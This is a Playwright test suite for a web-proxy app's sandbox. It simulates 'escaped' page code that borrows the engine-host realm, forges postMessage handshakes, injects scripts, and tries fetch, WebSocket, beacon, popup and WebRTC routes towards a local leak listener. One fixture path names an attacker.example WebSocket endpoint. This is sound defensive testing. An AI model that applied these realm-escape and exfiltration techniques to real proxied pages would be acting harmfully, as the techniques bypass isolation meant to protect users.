// Lane a: the attack rows WAVE-B §2 assigns to the engine-host core, on the real stack, both engines. "Escaped" code
// is modelled as the spike's attack suite did: playwright-core evaluates in the tab frame's own realm without any
// engine rewriting (spike §11.1), so the code reaches the proxy origin the way JavaScript that got out of its engine
// does.
//   borrow       no permissive realm (PROGRESS "Wave B inputs"; WAVE-B §6 item 5): every kind of proxy-origin
//                document is loaded in a hidden frame and fetch, WebSocket and new Image() are tried from ITS realm
//                towards a loopback listener the browsers reach only directly. Expected: nothing arrives.
//   handshake    a hello forged from a proxied (non-host) frame is ignored by the app; a connect forged into the
//                engine host from a tab frame is ignored by the engine host (one port per load), which keeps working.
//   host-inject  code injected into the engine-host realm forges a hello: the app is not expecting one (it counts
//                an unexpected hello, a compromise signal) and no new port reaches the injected code.
//   popup-native escaped code calls the native window.open of its own and of the engine host's realm: the engine
//                iframe has no allow-popups, so the browser opens nothing.
//   realm-walk   an ORDINARY page (its own engine-rewritten script, host-lib /realm-walk) finds no function of the
//                engine-host realm among the values, getters and setters of its window, document, navigator, history
//                and the prototypes GNOME wraps, in what the wrapped methods pass to Function.prototype.apply/call,
//                or in the errors they throw (WAVE-B3 §3.3 rule R1, §11.2 finding F1: such a function's constructor
//                hands out the engine host's global, i.e. turns the ordinary page into escaped code).
//   page-getters the converse (realm.ts rule 2): an ORDINARY page (host-lib /realm-traps) replaces the getters and
//                methods engine-host code could read on its objects with forwarding Proxies that record their
//                arguments array; real clicks (a target=_blank link, a download link, a GET form with a file), a
//                right-click in a nested frame, tab.find, a CSP violation and window.open with a page-made toString
//                drive GNOME's code. A trap called by engine-host code receives an engine-host array: none may.
//   borrow-natives an ORDINARY page calls a fresh child realm's native parent/top/frameElement getters on its own
//                window (host-lib /borrow-natives). Measured 2026-11-12 (lane a review): both engines, both browsers
//                hand it the engine-host window, i.e. an ordinary page can become escaped code without any engine
//                bug. A known limit of same-origin proxying (ENGINE-PROTOCOL §1.1 must say so); recorded expectFail.
//   escaped-native-routes  the spike's leak `bypass` (worklist A10): escaped code's routes to the network that do not
//                pass an engine (a blank child's fetch, the engine host's fetch, image and beacon, a popup, the engine
//                host's RTCPeerConnection): nothing arrives natively. `escaped-self-navigation`: its own tab frame
//                navigated away: the engine host's policy (frame-src from default-src 'self') refuses it.
//   escaped-engine-iframe-navigation  escaped code navigates the ENGINE IFRAME itself (the engine-host document runs
//                `location.href = …` through its own eval). That navigation is checked against the APP's frame-src,
//                so every source the shell policy lists is a native route (security review, integration part 2: its
//                nine game-embed hosts let a page load itch.io natively). Now only the proxy origin: a former
//                game-embed host and the app origin are refused, and no request reaches either.
import { fixtureQuery, inFrame, perEngine, readOutOf, realClick, startFixtures } from './host-lib.mjs';

/** In the tab frame (escaped): borrow `path` of the proxy origin, try the network from its realm. */
async function borrow({ path, leak, id }) {
  // Escaped code borrows through the engine-host realm, whose DOM no engine hooks (the tab document's own
  // createElement/src are the engine's and would proxy the path).
  const H = window.top[0];
  const f = H.document.createElement('iframe');
  f.style.cssText = 'position:absolute;width:10px;height:10px;opacity:0';
  const loaded = new Promise((r) => {
    f.onload = () => r('load');
    setTimeout(() => r('timeout'), 6000);
  });
  f.src = path;
  H.document.body.appendChild(f);
  const how = await loaded;
  const out = { how };
  let w;
  try {
    w = f.contentWindow;
    out.href = w.location.href.slice(0, 120);
    out.type = w.document.contentType;
  } catch (e) {
    out.read = `threw ${e.name}`;
    return out;
  }
  const t = async (k, fn) => {
    try {
      out[k] = await fn();
    } catch (e) {
      out[k] = `threw ${e && e.name}`;
    }
  };
  await t('fetch', () => w.fetch(`${leak}/b/${id}-fetch`, { mode: 'no-cors' }).then(() => 'resolved', (e) => `rejected ${e.name}`));
  await t('ws', () => new Promise((r) => {
    const s = new w.WebSocket(`${leak.replace('http', 'ws')}/b/${id}-ws`);
    s.onopen = () => r('open');
    s.onerror = () => r('error');
    setTimeout(() => r('pending'), 1500);
  }));
  await t('image', () => new Promise((r) => {
    const i = new w.Image();
    i.onload = () => r('loaded');
    i.onerror = () => r('error');
    i.src = `${leak}/b/${id}-img.png`;
    setTimeout(() => r('pending'), 1500);
  }));
  // A child the borrowed document creates inherits its policy (about:blank).
  await t('blankChildFetch', () => {
    const c = w.document.createElement('iframe');
    (w.document.body ?? w.document.documentElement).appendChild(c);
    return c.contentWindow.fetch(`${leak}/b/${id}-child`, { mode: 'no-cors' }).then(() => 'resolved', (e) => `rejected ${e.name}`);
  });
  f.remove();
  return out;
}

/** Path of the attack targets below: playwright's router answers it, so a request that is made never leaves the browser. */
const FRAME_NAV_PATH = '/gnome-attack-engine-iframe-nav';

/**
 * Escaped code navigates the engine iframe (the engine-host document itself) to each target. The app's frame-src
 * decides; a navigation it allows reaches playwright's router (`hits`), one it refuses makes no request (Chromium may
 * still preconnect to the host: ENGINE-PROTOCOL §1.1, a known limit; the sentinel sees that as a CONNECT). Each attempt
 * gets its own context and driver page: a refused navigation shows the browser's error page in the engine iframe, an
 * allowed one replaces the engine host.
 */
export async function engineIframeNavigation(ctx, browser, fx) {
  const targets = [
    ['a former game-embed host', `https://itch.io${FRAME_NAV_PATH}`],
    ['the app origin', `${ctx.stack.appOrigin}${FRAME_NAV_PATH}`],
  ];
  await perEngine(ctx, "attack:escaped-engine-iframe-navigation (the app's frame-src allows only the engine host)", async (engine) => {
    const notes = [];
    let reached = 0;
    let tried = 0;
    for (const [label, url] of targets) {
      const context = await ctx.newContext(browser);
      try {
        const hits = [];
        await context.route(
          (u) => u.pathname === FRAME_NAV_PATH,
          (route) => {
            hits.push(route.request().url());
            return route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>reached</title><p>reached</p>' });
          },
        );
        const app = await ctx.openApp(context, fixtureQuery(ctx, { fallback: '0' }));
        const a = await app.navigate(1, `${fx.origin}/`, { engine, create: true, timeout: 45000 });
        if (!a.ok) {
          notes.push(`${label}: page did not load (${JSON.stringify(a.error)})`);
          continue;
        }
        const f = await app.waitTabFrame(1, async (fr) => (await fr.evaluate(() => document.readyState)) === 'complete', 30000);
        if (!f) {
          notes.push(`${label}: frame not ready`);
          continue;
        }
        const t0 = Date.now();
        const sent = await inFrame(
          f,
          (u) => {
            const H = window.top[0];
            H.eval(`setTimeout(() => { location.href = ${JSON.stringify(u)}; }, 50)`);
            return 'scheduled';
          },
          url,
        ).catch((e) => `threw ${String(e.message).slice(0, 80)}`);
        await ctx.sleep(3500);
        tried++;
        reached += hits.length;
        const host = new URL(url).host;
        const connects = ctx.stack.sentinel.since(t0).filter((e) => JSON.stringify(e).includes(host)).length;
        const engineFrame = app.page.frames().find((fr) => fr.parentFrame() === app.page.mainFrame());
        notes.push(`${label}: ${sent}; requests that reached it ${hits.length}; sentinel lines naming ${host} ${connects}; engine iframe now ${String(engineFrame?.url() ?? '?').slice(0, 60)}`);
      } finally {
        await context.close().catch(() => {});
      }
    }
    return { result: tried === targets.length && reached === 0 ? 'pass' : 'fail', notes: notes.join('; ') };
  });
}

export async function run(ctx) {
  const fx = await startFixtures();
  const browser = await ctx.launch();
  try {
    const context = await ctx.newContext(browser);
    try {
      const app = await ctx.openApp(context, fixtureQuery(ctx, { fallback: '0' }));
      const host = app.page.frames().find((f) => /\/engine\/$/.test(f.url()));
      const asset = host ? await inFrame(host, () => document.querySelector('script[type=module]')?.getAttribute('src') ?? null) : null;
      let tab = 1;
      const KINDS = [
        ['engine-host', '/engine/'],
        ['engine-host-query', '/engine/?wisp=ws://attacker.example/'],
        ['api-health', '/api/health'],
        ['api-filters', '/api/filters'],
        ['not-found', '/gnome-no-such-path'],
        ['asset', asset ?? '/assets/missing.js'],
        ['vendor-js', '/vendor/scramjet/scramjet.js'],
        ['bare-mux-worker', '/vendor/bare-mux/worker.js'],
        ['sw-script', '/sw.js'],
        ['uv-config', '/engine/uv.config.js'],
        ['sj-stale-prefix', '/~/sj/deadbeef/cafe/https%3A%2F%2Fexample.com%2F'],
        ['uv-bad-url', '/uv/service/%%%'],
        ['wisp-probe', '/wisp/'],
      ];
      await perEngine(ctx, 'attack:borrow-proxy-origin-documents', async (engine) => {
        const id = tab++;
        const a = await app.navigate(id, `${fx.origin}/`, { engine, create: true, timeout: 45000 });
        if (!a.ok) return { result: 'fail', notes: `page did not load: ${JSON.stringify(a.error)}` };
        const f = await app.waitTabFrame(id, async (fr) => (await fr.evaluate(() => document.readyState)) === 'complete', 30000);
        if (!f) return { result: 'fail', notes: 'frame not ready' };
        const rows = [];
        let leaks = 0;
        for (const [kind, path] of KINDS) {
          fx.leak.reset();
          const r = await inFrame(f, borrow, { path, leak: fx.leak.origin, id: `${engine}-${kind}` }, 20000).catch((e) => ({ error: String(e.message).slice(0, 80) }));
          await ctx.sleep(300);
          // No engine runs in a borrowed document: every request at the listener left the browser natively.
          const hits = fx.leak.all();
          leaks += hits;
          rows.push(`${kind}${hits ? ` LEAK×${hits}` : ''} (${r.type ?? r.read ?? r.error ?? '?'}: fetch ${r.fetch}, ws ${r.ws}, img ${r.image}, child ${r.blankChildFetch})`);
        }
        return { result: leaks === 0 ? 'pass' : 'fail', notes: `native requests ${leaks}; ${rows.join('; ')}` };
      });

      await perEngine(ctx, 'attack:realm-walk (no engine-host function within an ordinary page\'s reach)', async (engine) => {
        const id = tab++;
        const a = await app.navigate(id, `${fx.origin}/realm-walk`, { engine, create: true, timeout: 45000 });
        if (!a.ok) return { result: 'fail', notes: `page did not load: ${JSON.stringify(a.error)}` };
        const r = await readOutOf(app, `tab-${id}`, 30000);
        await app.cmd('tab.close', { tabId: id }).catch(() => {});
        if (!r) return { result: 'fail', notes: 'no result from the page' };
        const hostErrors = Object.entries(r.errors ?? {}).filter(([, v]) => v === 'HOST').map(([k]) => k);
        const ok = r.checked > 100 && r.host.length === 0 && r.applyArrays.host === 0 && r.callThis.host === 0 && hostErrors.length === 0 && r.nodes > 5 && r.hostNodes === 0;
        return {
          result: ok ? 'pass' : 'fail',
          notes: `functions checked ${r.checked}; engine-host functions ${r.host.length}${r.host.length ? ` (${r.host.join(', ')})` : ''}; arrays through apply: page ${r.applyArrays.page}, host ${r.applyArrays.host}; host receivers through call ${r.callThis.host}; errors ${JSON.stringify(r.errors)}; nodes ${r.nodes}, engine-host wrappers ${r.hostNodes}`,
        };
      });

      await perEngine(ctx, 'attack:page-getters (engine-host code runs no page code)', async (engine) => {
        const id = tab++;
        const a = await app.navigate(id, `${fx.origin}/realm-traps`, { engine, create: true, timeout: 45000 });
        if (!a.ok) return { result: 'fail', notes: `page did not load: ${JSON.stringify(a.error)}` };
        const f = await app.waitTabFrame(id, async (fr) => (await fr.evaluate(() => document.title)) === 'Realm traps ready', 30000);
        if (!f) return { result: 'fail', notes: 'frame not ready' };
        const done = [];
        const step = async (name, fn) => {
          const m = await app.mark();
          try {
            await fn();
            await ctx.sleep(400);
            const got = (await app.eventsSince(m)).map((e) => e.type).filter((t) => t !== 'tab.loading' && t !== 'log');
            done.push(`${name} [${got.join(' ')}]`);
          } catch (e) {
            done.push(`${name}: ${String(e.message).slice(0, 60)}`);
          }
        };
        const since = await app.mark();
        await step('blank-link', () => realClick(app, f, '#blank'));
        await step('download-link', () => realClick(app, f, '#dl'));
        await step('file-form', async () => {
          const input = await f.waitForSelector('#ff', { timeout: 5000 });
          await input.setInputFiles({ name: 'secret.txt', mimeType: 'text/plain', buffer: Buffer.from('gnome') });
          await realClick(app, f, '#fbb');
        });
        await step('context-menu', async () => {
          const child = f.childFrames().find((c) => /realm-traps-child/.test(c.url()) || c.name() === 'nested') ?? f.childFrames()[0];
          if (!child) throw new Error('no nested frame');
          await child.waitForSelector('#ctx', { timeout: 10000 });
          await realClick(app, child, '#ctx', { button: 'right' });
        });
        await step('find', () => app.cmd('tab.find', { tabId: id, query: 'needle', backwards: false, caseSensitive: false }));
        await step('page-calls', () => inFrame(f, () => {
          window.openWithTrap();
          window.violate();
          document.title = 'Realm traps done';
        }));
        await ctx.sleep(2000);
        const r = await inFrame(f, () => window.report()).catch((e) => ({ error: String(e.message) }));
        const evts = (await app.eventsSince(since)).map((e) => e.type);
        const count = (t) => evts.filter((x) => x === t).length;
        await app.cmd('tab.close', { tabId: id }).catch(() => {});
        const exercised = `openRequest ${count('tab.openRequest')}, contextMenu ${count('tab.contextMenu')}, blocked ${count('tab.blocked')}, download.started ${count('download.started')}, title ${count('tab.title')}`;
        const ok = r && !r.error && r.calls > 0 && r.host === 0 && r.nodes > 5 && r.hostNodes === 0 && count('tab.openRequest') >= 2 && count('tab.contextMenu') >= 1;
        return { result: ok ? 'pass' : 'fail', notes: `trap calls ${r?.calls}; with an engine-host arguments array ${r?.host}; nodes ${r?.nodes}, engine-host wrappers ${r?.hostNodes}; scramjet client ${r?.scramjetClient}; steps ${done.join(', ')}; events: ${exercised}${r?.error ? `; ${r.error}` : ''}` };
      });

      await perEngine(ctx, 'attack:borrow-natives (an ordinary page reaches the engine host through a fresh realm\'s getters)', async (engine) => {
        const id = tab++;
        const a = await app.navigate(id, `${fx.origin}/borrow-natives`, { engine, create: true, timeout: 45000 });
        if (!a.ok) return { result: 'fail', notes: `page did not load: ${JSON.stringify(a.error)}` };
        const r = await readOutOf(app, `tab-${id}`, 30000);
        await app.cmd('tab.close', { tabId: id }).catch(() => {});
        if (!r) return { result: 'fail', notes: 'no result from the page' };
        const reached = Object.entries(r).filter(([, v]) => v === 'ENGINE-HOST').map(([k]) => k);
        const notes = `${Object.entries(r).map(([k, v]) => `${k}=${v}`).join(', ')}`;
        return reached.length === 0 ? { result: 'pass', notes } : { result: 'fail', expectFail: true, notes: `known limit, reported (engine host reached via ${reached.join(', ')}): ${notes}` };
      });

      await perEngine(ctx, 'attack:handshake-forgeries', async (engine) => {
        const id = tab++;
        const a = await app.navigate(id, `${fx.origin}/`, { engine, create: true, timeout: 45000 });
        if (!a.ok) return { result: 'fail', notes: `page did not load: ${JSON.stringify(a.error)}` };
        const f = await app.waitTabFrame(id, async (fr) => (await fr.evaluate(() => document.readyState)) === 'complete', 30000);
        const before = await app.gnome(() => ({ ...window.gnomeTest.hellos, instance: window.gnomeTest.instance }));
        const sent = await inFrame(f, () => {
          const out = {};
          // (1) a hello to the app from this (non-host) frame
          window.top.postMessage({ gnome: 'hello', protocol: 1, build: 'attacker', instance: 'forged0000000001' }, '*');
          out.hello = 'sent';
          // (2) a connect into the engine host from this frame, with a port, for the host's real instance unknown:
          // try every plausible form (the instance is not secret: hellos carry it)
          const ch = new MessageChannel();
          ch.port1.onmessage = (e) => {
            window.__gotFromHost = (window.__gotFromHost || 0) + 1;
            void e;
          };
          window.parent.postMessage({ gnome: 'connect', protocol: 1, instance: 'forged0000000001' }, '*', [ch.port2]);
          const ch2 = new MessageChannel();
          ch2.port1.onmessage = () => {
            window.__gotFromHost = (window.__gotFromHost || 0) + 1;
          };
          ch2.port1.start();
          window.parent.postMessage({ gnome: 'connect', protocol: 1, instance: window.__hostInstance || 'x' }, '*', [ch2.port2]);
          window.__probe = ch2.port1;
          ch2.port1.postMessage({ k: 'cmd', id: 1, type: 'ping', p: {} });
          out.connect = 'sent';
          return out;
        });
        await ctx.sleep(1500);
        const after = await app.gnome(() => ({ ...window.gnomeTest.hellos, instance: window.gnomeTest.instance }));
        const got = await inFrame(f, () => window.__gotFromHost || 0);
        const ping = await app.cmd('ping', {});
        const ok = after.connect === before.connect && after.instance === before.instance && got === 0 && ping.instance === before.instance;
        return { result: ok ? 'pass' : 'fail', notes: `sent ${JSON.stringify(sent)}; app hellos ${JSON.stringify(before)} → ${JSON.stringify(after)}; answers to the forged connect ${got}; host still answers ping ${ping.instance === before.instance}` };
      });

      await perEngine(ctx, 'attack:host-inject-forged-hello', async (engine) => {
        const id = tab++;
        const a = await app.navigate(id, `${fx.origin}/`, { engine, create: true, timeout: 45000 });
        if (!a.ok) return { result: 'fail', notes: `page did not load: ${JSON.stringify(a.error)}` };
        const f = await app.waitTabFrame(id, async (fr) => (await fr.evaluate(() => document.readyState)) === 'complete', 30000);
        const before = await app.gnome(() => ({ ...window.gnomeTest.hellos }));
        const inj = await inFrame(f, () => {
          const H = window.top[0];
          H.__attack = { ran: false, gotPort: false };
          const s = H.document.createElement('script');
          s.textContent =
            '(function(){var A=window.__attack;A.ran=true;window.addEventListener("message",function(e){if(e.data&&e.data.gnome==="connect"&&e.ports&&e.ports[0])A.gotPort=true;},true);' +
            'window.parent.postMessage({gnome:"hello",protocol:1,build:"attacker",instance:"injected00000001"},"*");})();';
          H.document.head.appendChild(s);
          return { ran: H.__attack.ran };
        });
        await ctx.sleep(2500);
        const res = await inFrame(f, () => window.top[0].__attack);
        const after = await app.gnome(() => ({ ...window.gnomeTest.hellos }));
        // The engine host's own CSP has no 'unsafe-inline'-free script-src, so the script may run: what matters is
        // that the app, not expecting a hello, does not hand out a port.
        const ok = !res.gotPort && after.connect === before.connect && after.unexpected > before.unexpected;
        const ranNote = inj.ran || res.ran ? 'the injected script ran in the engine-host realm' : 'the injected script did not run';
        return { result: ok ? 'pass' : 'fail', notes: `${ranNote}; port captured ${res.gotPort}; app hellos ${JSON.stringify(before)} → ${JSON.stringify(after)}` };
      });

      // Port of the spike's leak `bypass` part (worklist A10): escaped code (unrewritten JS in the proxied document)
      // tries every route to the network that does not pass its engine, each towards the loopback leak listener,
      // which the browsers reach only directly. GNOME's policies cover every realm involved: the page's fresh blank
      // child inherits the page's policy, the engine host has its own, the engine iframe has no allow-popups and the
      // engine host's WebRTC constructors are gone. The page's own fetch goes through its engine (arrives proxied).
      // Escaped code navigating its own tab frame away is refused by the engine host's policy (its `frame-src` falls
      // back to `default-src 'self' data: blob:`, which governs where its child frames may navigate): measured apart.
      await perEngine(ctx, 'attack:escaped-native-routes (CSP on every realm; spike leak `bypass`)', async (engine) => {
        const id = tab++;
        const a = await app.navigate(id, `${fx.origin}/`, { engine, create: true, timeout: 45000 });
        if (!a.ok) return { result: 'fail', notes: `page did not load: ${JSON.stringify(a.error)}` };
        const f = await app.waitTabFrame(id, async (fr) => (await fr.evaluate(() => document.readyState)) === 'complete', 30000);
        if (!f) return { result: 'fail', notes: 'frame not ready' };
        fx.leak.reset();
        fx.stun.reset();
        const pages = context.pages().length;
        const out = await inFrame(
          f,
          async ({ leak, stun }) => {
            const res = {};
            const t = async (k, fn) => {
              try {
                res[k] = await fn();
              } catch (e) {
                res[k] = `threw ${e && e.name}`;
              }
            };
            const H = window.top[0];
            await t('ownFetch', async () => fetch(`${leak}/own-fetch`).then((r) => `resolved ${r.status}`, (e) => `rejected ${e.name}`));
            await t('blankChildFetch', async () => {
              const c = document.createElement('iframe');
              document.body.appendChild(c);
              return c.contentWindow.fetch(`${leak}/blank-child`, { mode: 'no-cors' }).then(() => 'resolved', (e) => `rejected ${e.name}`);
            });
            await t('hostFetch', async () => H.fetch(`${leak}/host-fetch`, { mode: 'no-cors' }).then(() => 'resolved', (e) => `rejected ${e.name}`));
            await t('hostImage', () => {
              const i = new H.Image();
              i.src = `${leak}/host-image`;
              H.document.body.appendChild(i);
              return 'set';
            });
            await t('hostBeacon', () => (H.navigator.sendBeacon(`${leak}/host-beacon`, 'x') ? 'queued' : 'refused'));
            await t('popup', () => (H.open(`${leak}/popup`, '_blank') ? 'opened' : 'null'));
            await t('hostRtc', async () => {
              if (typeof H.RTCPeerConnection !== 'function') return 'absent';
              const pc = new H.RTCPeerConnection({ iceServers: [{ urls: stun }] });
              pc.createDataChannel('x');
              await pc.setLocalDescription(await pc.createOffer());
              await new Promise((r) => setTimeout(r, 1500));
              pc.close();
              return 'AVAILABLE';
            });
            return res;
          },
          { leak: fx.leak.origin, stun: fx.stun.url },
          30000,
        ).catch((e) => ({ error: String(e.message).slice(0, 120) }));
        await ctx.sleep(2500);
        const native = fx.leak.hits().map((h) => h.url);
        const proxied = fx.leak.proxied();
        const opened = context.pages().length - pages;
        const ok = native.length === 0 && opened === 0 && fx.stun.packets() === 0 && proxied >= 1;
        return { result: ok ? 'pass' : 'fail', notes: `native requests ${JSON.stringify(native)}; through the engine ${proxied}; pages opened ${opened}; STUN packets ${fx.stun.packets()}; ${JSON.stringify(out)}` };
      });

      await perEngine(ctx, 'attack:escaped-self-navigation (the engine host policy refuses a tab frame navigating away)', async (engine) => {
        const id = tab++;
        const a = await app.navigate(id, `${fx.origin}/`, { engine, create: true, timeout: 45000 });
        if (!a.ok) return { result: 'fail', notes: `page did not load: ${JSON.stringify(a.error)}` };
        const f = await app.waitTabFrame(id, async (fr) => (await fr.evaluate(() => document.readyState)) === 'complete', 30000);
        if (!f) return { result: 'fail', notes: 'frame not ready' };
        fx.leak.reset();
        const since = await app.mark();
        await inFrame(f, (leak) => {
          setTimeout(() => {
            location.href = `${leak}/self-nav`;
          }, 50);
          return 'scheduled';
        }, fx.leak.origin).catch(() => null);
        await ctx.sleep(3000);
        const native = fx.leak.hits().map((h) => h.url);
        const left = (await app.eventsSince(since)).some((e) => e.type === 'tab.error' && e.p.tabId === id && e.p.signal === 'frame-left-proxy');
        await app.cmd('tab.close', { tabId: id }).catch(() => {});
        return { result: native.length === 0 ? 'pass' : 'fail', notes: `native requests ${JSON.stringify(native)}; the app was told the frame left the proxy origin: ${left} (Chromium shows its error page in the frame, Firefox keeps the document)` };
      });

      await perEngine(ctx, 'attack:native-popup-from-escaped-code', async (engine) => {
        const id = tab++;
        const a = await app.navigate(id, `${fx.origin}/`, { engine, create: true, timeout: 45000 });
        if (!a.ok) return { result: 'fail', notes: `page did not load: ${JSON.stringify(a.error)}` };
        const f = await app.waitTabFrame(id, async (fr) => (await fr.evaluate(() => document.readyState)) === 'complete', 30000);
        const pages = context.pages().length;
        const r = await inFrame(f, () => {
          const out = {};
          const t = (k, fn) => {
            try {
              const w = fn();
              out[k] = w === null ? 'null' : typeof w;
            } catch (e) {
              out[k] = `threw ${e.name}`;
            }
          };
          const nativeOpen = Object.getOwnPropertyDescriptor(Window.prototype, 'open')?.value ?? window.top[0].open;
          t('ownRealm', () => nativeOpen.call(window, 'https://example.com/', '_blank'));
          t('engineHostRealm', () => window.top[0].open('https://example.com/', '_blank'));
          const c = document.createElement('iframe');
          document.body.appendChild(c);
          t('blankChildRealm', () => c.contentWindow.open('https://example.com/', '_blank'));
          return out;
        });
        await ctx.sleep(1500);
        const opened = context.pages().length - pages;
        return { result: opened === 0 ? 'pass' : 'fail', notes: `native pages opened ${opened}; ${JSON.stringify(r)}` };
      });
      await app.close();
    } finally {
      await context.close();
    }
    await engineIframeNavigation(ctx, browser, fx);
  } finally {
    await browser.close();
    await fx.close();
  }
}
